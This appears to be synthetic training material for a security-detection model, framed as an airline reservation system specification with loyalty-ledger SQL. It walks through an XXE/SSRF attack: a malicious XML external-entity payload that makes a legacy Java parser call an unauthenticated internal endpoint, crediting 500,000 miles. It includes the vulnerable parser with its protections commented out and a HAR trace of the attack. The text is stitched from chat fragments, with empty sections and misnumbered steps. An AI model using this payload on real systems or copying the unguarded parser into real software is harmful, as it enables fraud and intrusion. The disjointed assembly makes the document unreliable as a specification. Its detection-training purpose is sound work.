@@ -1,0 +1,275 @@
+========================================
+
+Here is the sixteenth system, continuing the expanded, high-density training format. We are shifting into the **Aviation & Travel** sector, focusing on a **Global Passenger Service System (PSS) & Loyalty API Gateway**.
+
+
+Here is **Part 1**. Type **c** when you are ready for Part 2.
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** AeroSync Global Passenger Service System (PSS)
+**Document Version:** 14.1.0 (FINAL)
+**Classification:** HIGHLY RESTRICTED / PCI-DSS & GDPR PII SCOPE
+**Domain:** Aviation / Airline Reservations / Loyalty Management
+
+## 1.0 Executive Summary
+AeroSync is the central nervous system for a major international airline. It manages flight inventory, seating assignments, passenger ticketing, and the "SkyRewards" frequent flyer loyalty program. 
+
+Because the aviation industry relies heavily on a mix of modern direct-to-consumer mobile apps and legacy Global Distribution Systems (GDS) used by third-party travel agencies (e.g., Expedia, corporate travel planners), AeroSync must support a hybrid API architecture. It simultaneously serves modern JSON REST APIs for the airline's mobile app and legacy SOAP/XML endpoints for B2B travel partners.
+
+## 2.0 Comprehensive Network Topology & Ingress Routing
+The architecture implements a strict boundary between external aggregators and the internal core reservation mainframes.
+
+### 2.1 The Edge & API Gateway
+* **Akamai Edge:** Handles global CDN caching, DDoS mitigation, and initial WAF inspection.
+* **Kong API Gateway:** The primary routing layer. It exposes two distinct ingress paths:
+    * `/api/v3/` - Modern REST/JSON endpoints for mobile and web.
+    * `/b2b/soap/v1/` - Legacy XML endpoints for registered travel agencies.
+
+### 2.2 The Internal Service Mesh (Kubernetes)
+* **Booking Engine:** A Java/Spring Boot microservice that interfaces with the legacy mainframes (Sabre/Amadeus) to confirm seat availability.
+* **SkyRewards Loyalty Service:** A lightweight Go-lang microservice that manages frequent flyer accounts, tier status (Silver, Gold, Platinum), and mile balances. It relies on a private internal network and trusts any requests coming from within the Kubernetes cluster.
+
+## 3.0 Identity, Access, and Legacy Integrations
+The security model is bifurcated depending on the integration type.
+
+### 3.1 Consumer Identity (OAuth 2.0)
+
+### 3.2 B2B Agency Authentication (mTLS & XML Security)
+
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+*Internal Security Engineering Note: The legacy B2B XML parser (Java DOM) was marked for deprecation in 2023, but migration of our largest corporate travel partner has been delayed. The parser currently runs on the same Kubernetes cluster network as the modern microservices. Tracked as RISK-AVIA-812.*
+
+**Sub-system:** Legacy Booking Engine (`/b2b/soap/v1/AvailabilityQuery`)
+
+**The Deep Architectural Flaw:**
+
+1.  An attacker compromises or registers a low-tier travel agency account, gaining the necessary mTLS certificates and API key to access the legacy `/b2b/soap/v1/AvailabilityQuery` endpoint.
+2.  The attacker crafts a malicious XML payload. In the DOCTYPE declaration, they define an external entity pointing to the internal, unauthenticated Loyalty service: `<!ENTITY inject SYSTEM "http://loyalty-svc.internal:8080/internal/v1/accounts/10045299/add-miles?amount=500000">`
+3.  The attacker places `&inject;` inside the legitimate `<FlightNumber>` tag.
+5.  **The Impact:** The internal Loyalty service receives the request, sees it coming from the trusted Booking Engine IP, and credits the attacker's frequent flyer account (`10045299`) with 500,000 miles. The attacker immediately uses the modern mobile app API to redeem these miles for a first-class international ticket.
+
+***
+
+
+
+***
+
+**Document Version:** 8.2.1
+**Applies to Architecture:** AeroSync Global PSS & Loyalty Gateway v14.1.0
+
+## 5.0 Loyalty Ledger Schema (PostgreSQL)
+The SkyRewards microservice uses a dedicated relational database to track frequent flyer accounts and their mileage balances. The system relies entirely on the internal network perimeter to protect the insertion of records into the `mileage_ledger`.
+
+```sql
+-- 1. Frequent Flyer Core Accounts Table
+CREATE TABLE loyalty_accounts (
+    account_number VARCHAR(15) PRIMARY KEY, -- e.g., '10045299'
+    passenger_id UUID NOT NULL,
+    tier_level VARCHAR(20) DEFAULT 'MEMBER', -- MEMBER, SILVER, GOLD, PLATINUM
+    total_miles_balance INT DEFAULT 0,
+    is_active BOOLEAN DEFAULT TRUE,
+    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
+);
+
+-- 2. Mileage Transaction Ledger (The Target of the Attack)
+CREATE TABLE mileage_ledger (
+    transaction_id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+    account_number VARCHAR(15) REFERENCES loyalty_accounts(account_number),
+    transaction_type VARCHAR(20) CHECK (transaction_type IN ('EARN', 'REDEEM', 'ADJUST_INTERNAL')),
+    amount INT NOT NULL,
+    source_system VARCHAR(50) NOT NULL, -- e.g., 'B2B_BOOKING_ENGINE', 'MOBILE_APP', 'ADMIN_TOOL'
+    reference_data TEXT,
+    executed_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
+);
+CREATE INDEX idx_ledger_account ON mileage_ledger(account_number);
+```
+
+## 6.0 The Flawed Implementation (Java / Spring Boot)
+
+```java
+package com.aerosync.b2b.controllers;
+
+import org.springframework.web.bind.annotation.*;
+import org.w3c.dom.Document;
+import org.xml.sax.InputSource;
+import javax.xml.parsers.DocumentBuilder;
+import javax.xml.parsers.DocumentBuilderFactory;
+import java.io.StringReader;
+
+@RestController
+@RequestMapping("/b2b/soap/v1")
+public class LegacyBookingController {
+
+    // POST /b2b/soap/v1/AvailabilityQuery
+    @PostMapping(value = "/AvailabilityQuery", consumes = "application/xml")
+    public ResponseEntity<String> checkAvailability(@RequestBody String xmlPayload) {
+        try {
+            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+            
+            // SECURITY FLAW: The following protections are explicitly missing or commented out:
+            // dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+            // dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+            // dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+            
+            DocumentBuilder builder = dbf.newDocumentBuilder();
+            
+            // If the XML contains an external entity pointing to an HTTP endpoint, the Java process makes the GET request.
+            Document doc = builder.parse(new InputSource(new StringReader(xmlPayload)));
+            
+            String flightNumber = doc.getElementsByTagName("FlightNumber").item(0).getTextContent();
+            String date = doc.getElementsByTagName("Date").item(0).getTextContent();
+
+            // ... proceeds to query Sabre/Amadeus mainframes ...
+            return ResponseEntity.ok("<Response><Status>AVAILABLE</Status></Response>");
+
+        } catch (Exception e) {
+            return ResponseEntity.badRequest().body("<Error>Malformed XML Request</Error>");
+        }
+    }
+}
+```
+
+This Go-lang endpoint runs on `http://loyalty-svc.internal:8080`. It has **no authentication** (Pattern 1.3) because the developers assumed only the trusted internal API gateway or admin panels could reach it. 
+
+```go
+// Intended exclusively for internal microservice-to-microservice communication
+// GET /internal/v1/accounts/:account_number/add-miles?amount={amount}
+func AddMilesInternal(c *gin.Context) {
+    accountNum := c.Param("account_number")
+    amount := c.Query("amount")
+    
+    // FLAW: Trusting the network boundary instead of explicitly authenticating the caller.
+    // Executes the SQL insert directly into the mileage_ledger.
+    db.Exec(`UPDATE loyalty_accounts SET total_miles_balance = total_miles_balance + $1 WHERE account_number = $2`, amount, accountNum)
+    
+    c.JSON(200, gin.H{"status": "MILES_CREDITED"})
+}
+```
+
+## 7.0 Legacy API Contracts (The XML Payloads)
+This demonstrates how an attacker abuses the legacy XML protocol to bridge the external internet to the highly sensitive internal Kubernetes network.
+
+### 7.1 Intended Safe Payload (Legitimate Travel Agency)
+A corporate travel partner checks seat availability for a flight from New York (JFK) to London (LHR).
+
+**Expected Request Payload:**
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <AvailabilityQuery>
+         <Origin>JFK</Origin>
+         <Destination>LHR</Destination>
+         <Date>2026-10-15</Date>
+         <FlightNumber>AS-882</FlightNumber>
+      </AvailabilityQuery>
+   </soapenv:Body>
+</soapenv:Envelope>
+```
+
+The attacker injects a `DOCTYPE` declaration defining an external entity (`&inject;`) that points to the internal Loyalty microservice URL. When the `FlightNumber` tag is parsed, the Java server fetches that URL, executing the state-changing GET request.
+
+**Malicious Request Payload:**
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE soapenv:Envelope [
+  <!ENTITY inject SYSTEM "http://loyalty-svc.internal:8080/internal/v1/accounts/10045299/add-miles?amount=500000">
+]>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <AvailabilityQuery>
+         <Origin>JFK</Origin>
+         <Destination>LHR</Destination>
+         <Date>2026-10-15</Date>
+         <FlightNumber>&inject;</FlightNumber>
+      </AvailabilityQuery>
+   </soapenv:Body>
+</soapenv:Envelope>
+```
+
+***
+
+**End of Part 2.**
+
+In the final chunk (Part 3), I will provide the **Synthetic HAR Trace**, capturing the attacker's XML submission and the resulting side-effect where the legacy booking engine acts as a confused deputy, successfully executing the unauthenticated internal network call and illegitimately awarding 500,000 frequent flyer miles.
+
+**Part 3: Synthetic Telemetry Artifact (HAR Trace) & Deep Analysis**
+
+***
+
+**Applies to Architecture:** AeroSync Global PSS & Loyalty Gateway v14.1.0
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 7.1 & Pattern 1.3)
+
+
+
+Because the internal service successfully executes the state-changing action (adding 500,000 miles) and returns a JSON response (`{"status": "MILES_CREDITED"}`), the Java XML parser attempts to inject this JSON string into the `<FlightNumber>` node. This causes a downstream casting error in the booking engine, resulting in a `500 Internal Server Error` returned to the attacker. Despite the error, the attack is fully successful, and the miles are permanently credited to the attacker's account.
+
+```json
+{
+  "log": {
+    "version": "1.2",
+    "creator": {
+      "name": "Kong API Gateway / WAF Audit Logs",
+      "version": "3.4.0"
+    },
+    "entries": [
+      {
+        "startedDateTime": "2026-04-09T07:10:45.102Z",
+        "time": 412,
+        "request": {
+          "method": "POST",
+          "url": "https://api.aerosync.com/b2b/soap/v1/AvailabilityQuery",
+          "httpVersion": "HTTP/2.0",
+          "headers": [
+            { "name": ":authority", "value": "api.aerosync.com" },
+            { "name": "x-api-key", "value": "ak_agency_77182X_live" },
+            { "name": "content-type", "value": "application/xml" },
+            { "name": "user-agent", "value": "TravelAggregator/2.0" }
+          ],
+          "queryString": [],
+          "postData": {
+            "mimeType": "application/xml",
+            "text": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n<!DOCTYPE soapenv:Envelope [\\n  <!ENTITY inject SYSTEM \"http://loyalty-svc.internal:8080/internal/v1/accounts/10045299/add-miles?amount=500000\">\\n]>\\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\\n   <soapenv:Header/>\\n   <soapenv:Body>\\n      <AvailabilityQuery>\\n         <Origin>JFK</Origin>\\n         <Destination>LHR</Destination>\\n         <Date>2026-10-15</Date>\\n         <FlightNumber>&inject;</FlightNumber>\\n      </AvailabilityQuery>\\n   </soapenv:Body>\\n</soapenv:Envelope>"
+          },
+          "bodySize": 542
+        },
+        "response": {
+          "status": 500,
+          "statusText": "Internal Server Error",
+          "headers": [
+            { "name": "content-type", "value": "application/xml" },
+            { "name": "x-booking-engine-node", "value": "eks-worker-10.24.1.8" }
+          ],
+          "content": {
+            "size": 256,
+            "mimeType": "application/xml",
+            "text": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><Error><Code>500</Code><Message>Fatal Error Processing Availability: Cannot cast '{\"status\": \"MILES_CREDITED\"}' to valid FlightNumber format (e.g., AS-123).</Message></Error>"
+          },
+          "bodySize": 256
+        }
+      }
+    ]
+  }
+}
+```
+
+***
+
+### Why this payload is critical for training a 3B model (Expanded Analysis):
+
+    * **DOCTYPE Recognition:** The AI must be trained to instantly flag the presence of a `<!DOCTYPE ...>` declaration within an inbound API payload, particularly when it includes `<!ENTITY ... SYSTEM ...>`. 
+    * **Protocol Bridging:** The model needs to recognize that the attacker is leveraging the XML parsing engine to bridge protocols. The attacker sends XML over the internet, but the XML parser translates the entity into an HTTP GET request inside the data center.
+
+    * **Confused Deputy Execution:** The model learns the concept of the "Confused Deputy." The legacy booking engine is trusted by the internal network. The attacker tricks the trusted engine into making the request on their behalf, inheriting its privileged network context.
+
+3. **State-Changing GET Requests (Architectural Anti-Pattern):**
+
+4. **Blind vs. Reflected Execution Evidence:**
+
+========================================
+========================================
+========================================
